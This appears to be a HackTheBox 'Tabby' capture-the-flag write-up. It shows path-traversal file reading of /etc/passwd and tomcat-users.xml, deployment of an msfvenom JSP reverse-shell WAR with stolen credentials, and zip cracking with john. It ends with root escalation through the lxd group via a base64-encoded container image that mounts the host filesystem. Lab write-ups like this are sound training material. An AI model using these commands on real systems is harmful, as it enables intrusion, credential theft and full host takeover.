# HackTheBox
------------------------------------
### IP: 10.129.247.87
### Name: Tabby
### Difficulty: Easy
--------------------------------------------

Tabby.png

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Tabby]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.129.247.87
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-19 13:47 CDT
Nmap scan report for 10.129.247.87
Host is up (0.088s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 453c341435562395d6834e26dec65bd9 (RSA)
|   256 89793a9c88b05cce4b79b102234b44a6 (ECDSA)
|_  256 1ee7b955dd258f7256e88e65d519b08d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.58 seconds
```

Looking at port 80 we find a site offering server storage:

tabby_mega_site.png

If we follow the link concerning news about a data breach we are forwarded to http://megahosting.htb/news.php?file=statement, so lets add megahosting.htb to `/etc/hosts`

Now we can access http://megahosting.htb/news.php?file=statement which is an apology regarding a data breach:

tabby_whoops.png

Looking at port 8080 we find a Tomcat It Works landing page:

tabby_8080.png

Going back to http://megahosting.htb/news.php?file=statement I want to test this for LFI. Lets use ffuf for this:

```
┌──(ryan㉿kali)-[~/HTB/Tabby]
└─$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://megahosting.htb/news.php?file==FUZZ' -fs 0   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://megahosting.htb/news.php?file==FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

[Status: 200, Size: 1850, Words: 16, Lines: 36, Duration: 8606ms]
    * FUZZ: /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

[Status: 200, Size: 1850, Words: 16, Lines: 36, Duration: 8661ms]
    * FUZZ: ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

[Status: 200, Size: 246, Words: 23, Lines: 11, Duration: 74ms]
    * FUZZ: ../../../../../../../../../../../../etc/hosts

[Status: 200, Size: 1850, Words: 16, Lines: 36, Duration: 72ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1850, Words: 16, Lines: 36, Duration: 73ms]
    * FUZZ: /../../../../../../../../../../etc/passwd

<SNIP>
```

Nice, looks like we've found a vulnerability.

We can access `/etc/passwd` at: http://megahosting.htb/news.php?file=%20/../../../../../../../../../../etc/passwd

tabby_lfi1.png

We can use `curl` and grep for bash to see which users have bash shells:

```
┌──(ryan㉿kali)-[~/HTB/Tabby]
└─$ curl http://megahosting.htb/news.php?file=%20/../../../../../../../../../../etc/passwd | grep bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1850  100  1850    0     0  13244      0 --:--:-- --:--:-- --:--:-- 13214
root:x:0:0:root:/root:/bin/bash
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

User ash looks interesting. 

Knowing there is an instance of TomCat running I decide to try locating the tomcat-users.xml file, which can contain sensitive information.

Looking back at the Tomcaat landing page we can confirm it is running tomcat version 9.

After a lot of trial and error I finally found it at: view-source:http://megahosting.htb/news.php?file=/../../../../usr/share/tomcat9/etc/tomcat-users.xml

tabby_tomcat_users.png

We now have the credentials `<user username="tomcat" password="$3cureP4s5w0rd123!"`

However, trying to login at http://megahosting.htb:8080/manager/html I get an access denied:

tabby_roles.png

Going back and looking at my credentials, I see the tomcat user only has access to `manager-script` and not `manager-gui`. 

This means I'll need to upload my malicious .war file manually in the command line, rather than using the GUI in `/manager`.

### Exploitation

Lets use msfvenom to generate a .war file:

```
┌──(ryan㉿kali)-[~/HTB/Tabby]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.240 LPORT=443 -f war > shell.war
Payload size: 1103 bytes
Final size of war file: 1103 bytes
```

I can then use `curl` to make a POST request to the server:

```
┌──(ryan㉿kali)-[~/HTB/Tabby]
└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/deploy?path=/shell --upload-file shell.war 
OK - Deployed application at context path [/shell]
```

And with a NC listener in place navigat to http://megahosting.htb:8080/shell/ to trigger the shell:

```
┌──(ryan㉿kali)-[~/HTB/Tabby]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.240] from (UNKNOWN) [10.129.235.218] 35096
whoami
tomcat
hostname
tabby
python3 -c 'import pty;pty.spawn("/bin/bash")'

tomcat@tabby:/var/lib/tomcat9$ 
```

Trying to access ash's home directory I gen an access denied:

```
tomcat@tabby:/home$ cd ash
bash: cd: ash: Permission denied
```

Looking around the system we find a backup zip file, but are unable to unzip it on the target, because we don't have the password:

```
tomcat@tabby:/var/www/html/files$ unzip 16162020_backup.zip
Archive:  16162020_backup.zip
checkdir error:  cannot create var
                 Read-only file system
                 unable to process var/www/html/assets/.
[16162020_backup.zip] var/www/html/favicon.ico password:
```

We can setup a Python http server on the target and use wget to download back to our local machine:

```
tomcat@tabby:/var/www/html/files$ python3 -m http.server 9999   
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
10.10.14.240 - - [20/Jun/2024 14:59:18] "GET /16162020_backup.zip HTTP/1.1" 200 -
```

We can then use zip2john to prep the file:

```
┌──(ryan㉿kali)-[~/HTB/Tabby/zip]
└─$ zip2john 16162020_backup.zip > crack_me
```

And then easily crack it with john:

tabby_john.png

```
┌──(ryan㉿kali)-[~/HTB/Tabby/zip]
└─$ unzip 16162020_backup.zip
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
  inflating: var/www/html/favicon.ico  
   creating: var/www/html/files/
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt
```

Not finding anything of interest in the zip file I tried to `su ash` with the discovered password and it worked: `ash:admin@it`

```
tomcat@tabby:/var/www/html/files$ su ash
Password: 
ash@tabby:/var/www/html/files$ whoami
ash
```

We can now grab the user.txt flag:

tabby_user_flag.png

### Privilege Escalation

Not initially seeing much of interest, I load LinPEAS and discover ash is in the lxd group.

I got stuck here forever and ended up looking at 0xdf's writeup at: https://0xdf.gitlab.io/2020/11/07/htb-tabby.html

Rather than building and alpine instance locally and transferring it over, I used this writeup that 0xdf mentions:https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1

Firstly I run:

```
echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
```

Then:
```
ash@tabby:/dev/shm$ /snap/bin/lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (ceph, btrfs, dir, lvm, zfs) [default=zfs]: 
Create a new ZFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=5GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
```
Pressing enter for each prompt to accept default settings.

Followed by:
```
ash@tabby:/dev/shm$ lxc image import bob.tar.bz2 --alias bobImage
ash@tabby:/dev/shm$ lxc init bobImage bobVM -c security.privileged=true
Creating bobVM
ash@tabby:/dev/shm$ lxc config device add bobVM realRoot disk source=/ path=r
Device realRoot added to bobVM
ash@tabby:/dev/shm$ lxc start bobVM
```

I can now run:
```
ash@tabby:/dev/shm$ /snap/bin/lxc exec bobVM -- /bin/sh
# whoami
root
# cd /r
# ls -la
total 90
drwxr-xr-x  20 root root  4096 Sep  7  2021 .
drwxr-xr-x  11 root root    15 Jun 20 15:45 ..
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Aug 19  2021 boot
drwxr-xr-x   2 root root  4096 Aug 19  2021 cdrom
drwxr-xr-x   5 root root  4096 Apr 23  2020 dev
drwxr-xr-x 100 root root  4096 Sep  7  2021 etc
drwxr-xr-x   3 root root  4096 Aug 19  2021 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 May 19  2020 lost+found
drwxr-xr-x   2 root root  4096 Jun 20 15:40 media
drwxr-xr-x   2 root root  4096 Aug 19  2021 mnt
drwxr-xr-x   3 root root  4096 Aug 19  2021 opt
drwxr-xr-x   2 root root  4096 Aug 19  2021 proc
drwx------   6 root root  4096 Jun 20 13:53 root
drwxr-xr-x  10 root root  4096 Aug 19  2021 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Sep  7  2021 snap
drwxr-xr-x   2 root root  4096 Aug 19  2021 srv
drwxr-xr-x   2 root root  4096 Aug 19  2021 sys
drwxrwxrwt  15 root root  4096 Jun 20 15:42 tmp
drwxr-xr-x  14 root root  4096 Apr 23  2020 usr
drwxr-xr-x  14 root root  4096 Aug 19  2021 var
# cd root
# ls
root.txt  snap
```

And grab the final flag:

tabby_root_flag.png

Thanks for following along!

-Ryan

--------------------------------